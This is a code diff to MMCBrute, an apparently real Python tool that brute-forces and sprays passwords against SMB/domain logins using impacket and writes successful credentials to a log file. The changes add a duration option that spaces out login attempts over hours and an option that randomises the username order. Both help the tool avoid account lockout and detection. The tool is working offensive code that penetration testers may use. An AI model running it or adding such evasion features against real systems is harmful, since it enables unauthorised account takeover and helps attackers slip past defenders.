@@ -31,12 +31,13 @@ import pathlib
 import logging
 import logging.handlers
 import time
+import random
 
 try:
 	from impacket.smbconnection import SMBConnection
 except ImportError:
 	print('You must install impacket before continuing')
-	sys.exit(os.EX_SOFTWARE)
+	sys.exit(1)
 
 def get_timestamp():
 	hmsp = datetime.datetime.now().strftime('%I:%M %p')
@@ -49,7 +50,8 @@ def is_readable_file(path):
 
 class MMCBrute(object):
 	def __init__(self, usernames, passwords, domain, target, output_log, output_creds,
-	             user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO'):
+	             user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO',
+	             duration=None, randomize=False):
 		self.usernames = open(usernames, 'r')
 		self.len_usernames = sum((1 for _ in self.usernames))
 		self.usernames.seek(os.SEEK_SET)
@@ -80,6 +82,10 @@ class MMCBrute(object):
 		self.count = 0
 		self.len_passwords = 0
 		self.len_targets = 1
+		self.duration = duration
+		self.randomize = randomize
+		self.start_time = None
+		self.delay_between_attempts = 0
 
 		if passwords is not None:
 			self.passwords = open(passwords, 'r')
@@ -99,10 +105,16 @@ class MMCBrute(object):
 
 		self.totals = self.len_usernames * self.len_passwords
 
+		if self.duration:
+			duration_seconds = self.duration * 3600
+			if self.totals > 1:
+				self.delay_between_attempts = duration_seconds / (self.totals - 1)
+
 	@classmethod
 	def from_args(cls, args):
 		return cls(args.usernames, args.passwords, args.domain, args.target, args.output_log,
-		           args.output_creds, args.uap, args.hb, args.verbose, args.loglvl)
+		           args.output_creds, args.uap, args.hb, args.verbose, args.loglvl,
+		           args.duration, args.randomize)
 
 	def update_progress(self):
 		self.count += 1
@@ -114,13 +126,21 @@ class MMCBrute(object):
 			f.write(f"{msg}\n")
 
 	def run(self):
+		self.start_time = time.time()
+
 		for target in self.targets:
 			target = target.strip()
 			self.target = target
 			smb_connection = SMBConnection(self.target, self.target)
-			for user in enumerate(self.usernames):
-				user = user[-1].strip()
+
+			username_list = [user.strip() for user in self.usernames]
+			if self.randomize:
+				random.shuffle(username_list)
+
+			for user in username_list:
 				if self.user_as_pass:
+					if self.duration and self.count > 0:
+						time.sleep(self.delay_between_attempts)
 					self.update_progress()
 					next_user = self.login(self.target, self.domain, user, user, smb_connection)
 					if next_user:
@@ -132,6 +152,8 @@ class MMCBrute(object):
 					self.passwords.seek(os.SEEK_SET)
 					for password in enumerate(self.passwords):
 						password = password[-1].strip()
+						if self.duration and self.count > 0:
+							time.sleep(self.delay_between_attempts)
 						self.update_progress()
 						next_user = self.login(self.target, self.domain, user, password, smb_connection)
 						if next_user:
@@ -153,7 +175,7 @@ class MMCBrute(object):
 			msg = str(msg)
 			if 'STATUS_NO_LOGON_SERVERS' in msg:
 				self.logger.info(f"\033[93m[-] No Logon Servers Available on {target}\033[0m")
-				sys.exit(os.EX_SOFTWARE)
+				sys.exit(1)
 
 			elif 'STATUS_LOGON_FAILURE' in msg:
 				if self.verbose:
@@ -171,7 +193,7 @@ class MMCBrute(object):
 						return False
 					else:
 						self.logger.info('\033[91m[-]Exiting...')
-						sys.exit(os.EX_SOFTWARE)
+						sys.exit(1)
 
 			elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
 				self.logger.info(f"\033[92m[+] Success (User never logged in to change password) {attempt}\033[0m")
@@ -211,6 +233,10 @@ class MMCBrute(object):
 		self.logger.info(f"\033[94mUser-as-Pass Mode:\t{self.user_as_pass}\033[0m")
 		self.logger.info(f"\033[94mHoney Badger Mode:\t{self.honeybadger}\033[0m")
 		self.logger.info(f"\033[94mVerbose Mode:\t\t{self.verbose}\033[0m")
+		if self.duration:
+			self.logger.info(f"\033[94mDuration Mode:\t\t{self.duration} hours\033[0m")
+			self.logger.info(f"\033[94mDelay per attempt:\t{self.delay_between_attempts:.2f} seconds\033[0m")
+		self.logger.info(f"\033[94mRandomize Usernames:\t{self.randomize}\033[0m")
 
 if __name__ == '__main__':
 	script_path = os.path.dirname(os.path.abspath(__file__))
@@ -228,6 +254,8 @@ if __name__ == '__main__':
 	group.add_argument('-o', '--output', action='store', dest='output_log', default='./logs/mmcbrute.log', help='Path to output logfile')
 	group.add_argument('-c', '--creds', action='store', dest='output_creds', default='./logs/creds.log', help='Path to output creds file')
 	group.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Show failed bruteforce attempts')
+	group.add_argument('--duration', action='store', type=float, dest='duration', help='Duration in hours to spread out spray attempts')
+	group.add_argument('--randomize', action='store_true', dest='randomize', help='Randomize the order of usernames from the -U list')
 	options = parser.parse_args()
 	output_log = options.output_log
 	output_creds = options.output_creds
